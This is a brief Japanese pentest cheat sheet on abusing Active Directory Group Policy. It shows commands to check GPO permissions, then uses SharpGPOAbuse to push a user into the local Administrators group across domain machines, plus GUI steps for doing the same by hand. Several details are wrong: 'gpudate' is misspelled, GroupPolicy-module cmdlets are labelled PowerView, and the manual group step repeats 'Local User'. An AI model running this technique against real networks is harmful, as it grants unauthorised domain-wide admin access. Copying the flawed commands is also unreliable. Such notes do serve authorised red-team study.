# Group Policiesの悪用

`Group Policies` はActive Directoryの管理機能である。これにより、管理者はコンピューターやユーザーを管理することができる。グループポリシーオブジェクト（GPO）はグループポリシーを構成する。GPOはADオブジェクト（サイト、ドメイン、組織単位（OU））に関連付けられる。

グループ ポリシーには、セキュリティ オプション、レジストリ キー、ソフトウェアのインストール、起動とシャットダウンのスクリプトを含めることができ、ドメイン メンバーは既定で 90 分ごとにグループ ポリシー設定を更新する (ドメイン コントローラーの場合は 5 分ごと)。つまり、グループ ポリシーは、対象のコンピューターで構成された設定を適用する。

## Domain Policy の権限を確認する

#### PowerView

ドメインポリシーを取得する

```
Get-GPO -Name "<Domain Policy>"
```

ドメインの権限を確認する

```
Get-GPPermission -Guid <Domain ID> -TargetType User -TargetName <USERNAME>
```

## 権限を悪用してローカル管理者グループにユーザー追加する

`GpoEditDeleteModifySecurity` という権限を持っているとき [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse.git)というツールを使用してユーザーをローカルの `Administrators Group` に追加することができる。

```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USERNAME> --GPOName "<Domain Policy>"
```

実行に成功したらローカルグループポリシーを更新する

```
gpudate /force
```

追加されているか確認する

```
net localgroup Administrators
net user <USERNAME>
```

## ローカル管理者グループにユーザーを手動で追加する

ユーザーを作成する

```
Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Create > User name:
```

ユーザーをローカル管理者グループに追加する

```
Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Update > Group name : > Members: Add:
```

